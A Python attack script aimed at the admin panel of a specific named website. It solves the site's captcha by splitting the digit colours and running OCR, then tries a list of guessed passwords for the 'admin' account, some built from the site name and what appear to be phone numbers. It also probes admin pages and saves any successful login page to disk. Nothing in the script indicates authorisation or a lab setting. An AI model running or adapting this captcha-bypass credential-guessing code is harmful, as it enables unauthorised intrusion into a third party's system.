import pytesseract
from PIL import Image, ImageFilter
import requests
import io
import re

def extract_digit_from_color(img, target_color, tolerance=30):
    """Extract pixels matching a specific color, return binary image."""
    w, h = img.size
    result = Image.new('L', (w, h), 255)
    pixels = result.load()
    src = img.load()
    
    for y in range(h):
        for x in range(w):
            r, g, b = src[x, y]
            tr, tg, tb = target_color
            if abs(r - tr) <= tolerance and abs(g - tg) <= tolerance and abs(b - tb) <= tolerance:
                pixels[x, y] = 0  # Black (digit)
            else:
                pixels[x, y] = 255  # White (background)
    
    return result

def try_login_with_retry(username, password, max_retries=5):
    """Try login with retries on captcha failures."""
    for attempt in range(max_retries):
        session = requests.Session()
        
        # Get main page
        session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        
        # Download captcha
        r = session.get("http://bjhzsv.com/main/inc/code.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            continue
        
        img = Image.open(io.BytesIO(r.content))
        
        # The 4 colors used in captcha digits
        colors = [
            (203, 68, 2),    # dark orange
            (0, 62, 221),    # blue
            (217, 0, 0),     # red
            (2, 109, 164),   # teal
        ]
        
        digits = []
        for c in colors:
            bw = extract_digit_from_color(img, c)
            # Enlarge
            big = bw.resize((100, 50), Image.NEAREST)
            # OCR
            text = pytesseract.image_to_string(big, config='--psm 10 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
            clean = ''.join(ch for ch in text if ch.isdigit())
            if clean:
                digits.append(clean[0])
            else:
                # Try with --psm 8
                text2 = pytesseract.image_to_string(big, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
                clean2 = ''.join(ch for ch in text2 if ch.isdigit())
                if clean2:
                    digits.append(clean2[0])
                else:
                    digits.append('?')
        
        captcha_text = ''.join(digits)
        print(f"  Attempt {attempt+1}: Individual digits: {digits} -> captcha={captcha_text}")
        
        # Validate: must have exactly 4 digits
        if len(captcha_text) != 4 or '?' in captcha_text:
            print(f"  Invalid captcha, retrying...")
            continue
        
        # POST login
        login_data = {"t1": username, "t2": password, "t3": captcha_text}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "http://bjhzsv.com/main/"
        }
        
        r = session.post("http://bjhzsv.com/main/a7chkuser.asp", data=login_data, headers=headers, timeout=15)
        
        print(f"  Response ({len(r.text)} bytes): {r.text[:200]}")
        
        # Check response - if login fails we get redirect to index.asp
        # If login succeeds we might get different content or redirect to a different page
        # Let's check by following the redirect
        if 'index.asp' in r.text:
            # Follow redirect
            r2 = session.get("http://bjhzsv.com/main/index.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
            
            # Check if we're still on login page or if content changed
            # The login page has form with action a7chkuser.asp
            if 'a7chkuser.asp' not in r2.text:
                print(f"  *** DIFFERENT PAGE AFTER LOGIN! SUCCESS POSSIBLE! ***")
                print(f"  Content: {r2.text[:500]}")
                return True, captcha_text, r2.text
            
            # Check if there are additional pages available
            for page in ["left.asp", "top.asp", "right.asp", "admin_main.asp", "admin_index.asp"]:
                r3 = session.get(f"http://bjhzsv.com/main/{page}", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
                if r3.status_code == 200 and len(r3.text) > 500 and 'a7chkuser' not in r3.text:
                    print(f"  Found admin page: {page} ({len(r3.text)} bytes)")
                    print(f"  Content preview: {r3.text[:300]}")
                    return True, captcha_text, r3.text
        
        # Also try fetching other common pages after login
        r_main = session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if 'a7chkuser.asp' not in r_main.text:
            print(f"  Main page changed after login! SUCCESS!")
            print(f"  Content: {r_main.text[:500]}")
            return True, captcha_text, r_main.text
        
        print(f"  Login failed (same login page returned)")
    
    return False, None, None

passwords = [
    "admin",
    "admin999",
    "admin888", 
    "123456",
    "bjhzsv",
    "bjhzsv.com",
    "13681449049",
    "01062489782"
]

username = "admin"

print("=" * 60)
print("BJZHSV.COM COLOR-BASED CAPTCHA OCR + LOGIN")
print("=" * 60)

# Test captcha OCR first
print("\n[TEST] Testing captcha OCR quality...")
for i in range(3):
    session = requests.Session()
    session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
    r = session.get("http://bjhzsv.com/main/inc/code.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
    img = Image.open(io.BytesIO(r.content))
    
    colors = [(203, 68, 2), (0, 62, 221), (217, 0, 0), (2, 109, 164)]
    digits = []
    for c in colors:
        bw = extract_digit_from_color(img, c)
        big = bw.resize((100, 50), Image.NEAREST)
        text = pytesseract.image_to_string(big, config='--psm 10 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
        clean = ''.join(ch for ch in text if ch.isdigit())
        digits.append(clean[0] if clean else '?')
    print(f"  Test {i+1}: {''.join(digits)}")

print("\n" + "=" * 60)
print("LOGIN ATTEMPTS")
print("=" * 60)

for pwd in passwords:
    print(f"\n{'='*60}")
    print(f"TRYING: {username}:{pwd}")
    print(f"{'='*60}")
    
    success, captcha, resp = try_login_with_retry(username, pwd)
    
    if success:
        print(f"\n  *** SUCCESS! Password: {pwd} (captcha: {captcha}) ***")
        with open(f"/tmp/bjhzsv_success.html", "w") as f:
            f.write(resp)
        break

print("\n" + "=" * 60)
print("ALL DONE")
print("=" * 60)
